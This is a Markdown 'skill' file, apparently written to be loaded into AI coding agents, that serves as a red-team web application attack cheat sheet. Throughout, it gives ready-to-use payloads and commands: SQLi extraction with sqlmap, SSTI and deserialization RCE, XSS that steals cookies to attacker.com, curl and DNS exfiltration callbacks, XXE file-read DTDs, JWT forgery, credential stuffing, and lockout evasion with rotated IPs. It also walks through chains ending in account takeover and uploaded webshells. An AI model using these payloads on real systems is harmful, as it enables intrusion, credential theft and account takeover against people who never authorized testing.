<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: web
description: >-
  Web application attacks including SQLi, XSS, SSRF, SSTI, XXE, deserialization, JWT
  attacks, OAuth abuse, CORS misconfiguration, prototype pollution, file upload bypass,
  IDOR, HTTP request smuggling, cache poisoning, GraphQL exploitation, and API security
  testing. Use when asked about web app attacks, OWASP vulnerabilities, API hacking,
  or browser-based exploitation.
domain: cybersecurity
subdomain: web-application-security
tags:
  - web-security
  - owasp
  - sqli
  - xss
  - ssrf
  - ssti
  - jwt
  - api-security
  - deserialization
  - request-smuggling
version: "1.1"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1190", "T1059.007", "T1071.001"]
  owasp: ["A01:2021", "A02:2021", "A03:2021", "A04:2021", "A08:2021", "A10:2021"]
---
# Red Team — Web Application

## When to Use
Triggered when the operator asks about web application attacks, OWASP vulnerabilities,
API hacking, authentication bypass, XSS, SQLi, SSRF, SSTI, XXE, deserialization,
JWT attacks, OAuth abuse, CORS, prototype pollution, file upload, IDOR, request
smuggling, web cache poisoning, or browser-based exploitation.

## Quick Reference
- SQLmap: `sqlmap -u "http://target/page?id=1" --dbs --level=5 --risk=3`
- SQLmap POST: `sqlmap -u "http://target/login" --data="user=a&pass=b" -p user --dbs`
- SSTI detect: inject `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` — match output `49` per engine
- SSTImap: `python3 sstimap.py -u 'https://target.com/page?name=Inject*' -s`
- JWT none alg: set `"alg":"none"`, remove signature, pad with `.`
- JWT RS256→HS256: sign with server's public key as HMAC secret
- JWT crack: `hashcat -m 16500 token.txt wordlist.txt`
- SSRF cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- SSRF bypass: `http://127.0.0.1.nip.io`, `http://[::1]`, `http://0177.0.0.1` (octal)
- XXE OOB: `<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">`, trigger DNS/HTTP exfil
- OAuth redirect abuse: `redirect_uri=https://evil.com` or append path traversal
- Prototype pollution: `{"__proto__":{"isAdmin":true}}` in JSON merge endpoints
- CORS steal: origin reflection + credentials=true → fetch sensitive API endpoints
- Burp active scan + Param Miner extension for hidden params and cache keys

## Workflow

### Injection (SQLi, Command Injection, LDAP)

SQLi detection: single quote `'`, then `'--`, `' OR 1=1--`, `'; WAITFOR DELAY '0:0:5'--`

```bash
# Automated full extraction
sqlmap -u "http://target/item?id=1" --dbs --tables -D dbname --dump
# Blind time-based (MySQL)
sqlmap -u "http://target/" --data="id=1" --dbms=mysql --technique=T --level=5
# OOB DNS exfil (MSSQL)
'; exec master..xp_dirtree '//attacker.com/a'--
# PostgreSQL RCE via COPY
'; COPY cmd_exec FROM PROGRAM 'id'; SELECT output FROM cmd_exec--
# Second-order SQLi: inject into stored value retrieved later, not immediate reflection
```

Command injection entry points: ping fields, DNS lookup inputs, filename parameters, eval()-wrapped inputs.

```bash
# Blind OOB: `; curl http://attacker.com/$(id)` / `; nslookup $(whoami).attacker.com`
# Time-based blind: `; sleep 5` / `; ping -c 5 127.0.0.1`
# WAF bypass: `%0a`, IFS=${IFS:0:1}, ${IFS}, brace expansion `{cat,/etc/passwd}`
```

**Anti-pattern:** Running `sqlmap --level=3` against a WAF-protected endpoint without tuning tamper scripts — use `--tamper=space2comment,between,randomcase` first.

### SSRF (Server-Side Request Forgery)

Cloud metadata targets:
- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true` header
- GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` + `Metadata-Flavor: Google`

SSRF filter bypasses:
```
http://127.0.0.1.nip.io          # DNS redirect to 127.0.0.1
http://[::1]                     # IPv6 loopback
http://0177.0.0.1                # Octal encoding
http://2130706433                # Decimal encoding of 127.0.0.1
http://localtest.me              # Resolves to ::1
gopher://127.0.0.1:6379/_PING    # Redis SSRF RCE via Gopher
dict://127.0.0.1:11211/stats     # Memcache info leak
file:///etc/passwd               # LFI via SSRF (if file:// allowed)
```

**Anti-pattern:** Only testing `localhost` — DNS rebinding and IPv6 bypasses work when allowlist checks pre-resolution.

### SSTI (Server-Side Template Injection)

Detection polyglot: `${{<%[%'"}}%\` — triggers syntax errors across engines.
Engine fingerprinting via error messages and rendering behavior:

```
Jinja2 (Python): {{7*'7'}} → 7777777; RCE: {{''.__class__.__mro__[1].__subclasses__()[SUBPROCESS_IDX]('id',shell=True,stdout=-1).communicate()}}
Twig (PHP): {{7*'7'}} → 49; RCE: {{['id']|map('system')|join}}
FreeMarker (Java): ${7*7} → 49; RCE: ${freemarker.template.utility.Execute?new()("id")}
Velocity (Java): #set($x = 7*7)${x}; RCE via Runtime.exec()
Pebble (Java): {{7*7}}; RCE: {% set cmd = "id" %}{{ Runtime.exec(cmd) }}
ERB (Ruby): <%=7*7%>; RCE: <%=`id`%>
Smarty (PHP): {7*7}; RCE: {system('id')}
```

Automated: `python3 sstimap.py -u 'http://target/?name=*' -s` — detects engine, escalates to RCE.

**Anti-pattern:** Only injecting `{{7*7}}` — Jinja2 and Twig both render 49; differentiate with `{{7*'7'}}` (Jinja2: `7777777`, Twig: `49`).

### XSS and Client-Side Attacks

Stored XSS → account takeover: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`

CSP bypass patterns:
- `script-src 'unsafe-eval'` → AngularJS template injection `{{constructor.constructor('alert(1)')()}}`
- `script-src cdn.jsdelivr.net` → find JSONP/Angular on same CDN
- Dangling markup: `<img src='http://attacker.com/?` in broken-context injection points

DOM XSS sources: `location.hash`, `document.referrer`, `URLSearchParams`, `window.name`.
DOM XSS sinks: `innerHTML`, `eval()`, `document.write()`, `setTimeout(str)`, `location.href=`.

XXE injection:
```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
<!-- OOB exfil (blind XXE) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">%xxe;]>
<!-- evil.dtd: <!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % out "<!ENTITY exfil SYSTEM 'http://attacker/?%data;'>">%out; -->
```

**Anti-pattern:** Testing XXE only in XML content-type bodies — check JSON endpoints that accept `Content-Type: application/xml`, SOAP actions, SVG uploads, and DOCX/XLSX files.

### Authentication and Session Attacks

JWT attacks:
```bash
# None algorithm — alg=none, empty signature
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# RS256 to HS256 confusion: sign token with server's public key as HMAC-SHA256 secret
python3 -c "import jwt,base64; key=open('pub.pem').read(); print(jwt.encode({'admin':True},key,algorithm='HS256'))"
# Brute-force weak secret
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
# jwt_tool multipurpose: tamper, scan, attack
python3 jwt_tool.py <token> -T   # tamper claims
python3 jwt_tool.py <token> -C -d wordlist.txt  # crack
```

Password attacks:
```bash
# Credential stuffing
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# Username enumeration: timing attacks, error message differences, account lockout behavior
# Default creds: admin:admin, admin:password, admin:<company>, first+last@company.com:Season+Year
```

OAuth misconfigurations:
- `redirect_uri` not strictly validated → host any controlled subdomain
- State parameter absent → CSRF to force victim to attacker-controlled auth code
- Authorization code reuse → try replaying code after exchange
- Open redirect on `redirect_uri` domain → chain to steal code via Referer

**Anti-pattern:** Stopping at account lockout — try distributed spray (1 attempt per account per hour, rotated IPs).

### IDOR and Business Logic

IDOR discovery: change numeric IDs, GUIDs, hashes in path/body/headers. Check:
- `GET /api/users/123` → try 124, 1, -1
- `X-User-Id`, `accountId`, `customerId` headers
- Bulk operations: `/api/orders?ids[]=1&ids[]=2` → add other user's IDs
- Indirect references: filename in parameter → `../../../../etc/passwd`

Business logic:
- Race conditions on purchase/coupon redemption: Turbo Intruder parallel requests
- Negative quantity in cart, integer overflow in discount fields
- Skip-step in multi-step flows: jump to step 3 from step 1 session
- Mass assignment: send extra fields (`isAdmin`, `role`, `discount`) in JSON body

**Anti-pattern:** Testing IDOR only in GET requests — POST/PUT/DELETE often have the same flaw.

### API Security

GraphQL:
```bash
# Introspection (enable enumeration of schema)
{"query":"{__schema{types{name fields{name}}}}"}
# Bypass introspection block: newline before `__schema`, spaces in query
# Field-level access control: try admin fields with low-priv token
# Batching attack: send array of queries to bypass rate limits
[{"query":"mutation{login(user:'a',pass:'a')}"}, {"query":"mutation{login(user:'a',pass:'b')}"},...]
```

REST API:
- Version enumeration: `/api/v1/`, `/api/v2/`, `/api/v3/` — older versions often lack auth
- HTTP verb tampering: endpoint accepts GET but not POST? Try PUT/PATCH/DELETE
- Content-type confusion: `application/xml` on JSON endpoint, bypass validation
- Mass assignment: send extra JSON fields the server shouldn't accept

**Anti-pattern:** Only testing authenticated API endpoints — check unauthenticated routes, especially health checks, swagger docs (`/api/docs`, `/swagger-ui`), and debug endpoints.

### Deserialization

Java: `ysoserial` gadget chain generation:
```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(id)' | base64
# Gadget chains: CommonsCollections1-7, Spring, Hibernate, Groovy — depends on classpath
# Detect: `rO0` (base64 of 0xACED Java serial magic) in cookies/params
```

PHP: `unserialize()` with controlled input — find classes with `__wakeup`, `__destruct`.
Python pickle: `REDUCE` opcode executes arbitrary code.
```python
import pickle, os
class Exploit(object):
    def __reduce__(self): return (os.system, ('curl http://attacker.com/$(id)',))
```

Node.js: prototype pollution via `JSON.parse` + `Object.assign` on untrusted keys.

**Anti-pattern:** Testing only Java deserialization — check for pickle in Python Flask/Django API cookies (`.` separated base64 vs JWT-like), PHP in session cookies.

### HTTP Request Smuggling and Cache Poisoning

Request smuggling:
```
# CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked
0

G
# TE.CL: send `Transfer-Encoding: chunked\r\n` with chunked body, back-end interprets CL
```

Cache poisoning:
- Host header injection → cache response with attacker-controlled host in links
- Unkeyed headers: `X-Forwarded-Host`, `X-Original-URL`, `X-Forwarded-Scheme`
- Cache key normalization: `/?foo=bar%00` may match `/?foo=bar` in cache
- Param Miner (Burp) automates unkeyed header/param discovery

**Anti-pattern:** Testing cache poisoning on non-cacheable endpoints — check for `Cache-Control: public`, CDN/Varnish/Nginx cache headers first.

## Key Chains

### Unauthenticated RCE via SSTI + SSRF
1. Find reflected parameter in Jinja2/Twig template context
2. Confirm SSTI with `{{7*'7'}}` → `7777777` (Jinja2) or `49` (Twig)
3. RCE via subprocess: `{{''.__class__.__mro__[1].__subclasses__()[SUBPROCESS]('id',shell=True,stdout=-1).communicate()}}`
4. Pivot: use RCE to curl internal metadata service → extract IAM credentials
5. Use IAM credentials to enumerate cloud environment laterally

### API Auth Bypass → Account Takeover Chain
1. Enumerate API via Swagger/OpenAPI docs at `/api/docs` or `/swagger.json`
2. Identify password reset endpoint lacking rate limiting
3. Fuzz reset token (4-6 digit OTP) via Turbo Intruder with 50 concurrent threads
4. Or: JWT RS256→HS256 confusion — sign admin token with public key, bypass auth
5. IDOR in user update endpoint: change `userId` to victim's ID, update email
6. Trigger password reset to attacker-controlled email → full account takeover

### File Upload → RCE
1. Upload `.php` file — check MIME type filter bypass: `Content-Type: image/png`, double extension `shell.php.jpg`
2. Test magic bytes bypass: prepend `GIF89a` before PHP payload
3. SSRF from upload if URL-based fetching: supply internal URL as image source
4. If filename reflected: path traversal `../../../../var/www/html/shell.php`
5. Access shell: `http://target.com/uploads/shell.php?cmd=id`

---
v1.1 | Validated: 2026-03-13

## Verification

- [ ] All attack techniques tested within authorized scope
- [ ] Findings documented with evidence and MITRE ATT&CK mapping
- [ ] Cleanup completed — all artifacts removed
- [ ] Detection opportunities noted for blue team
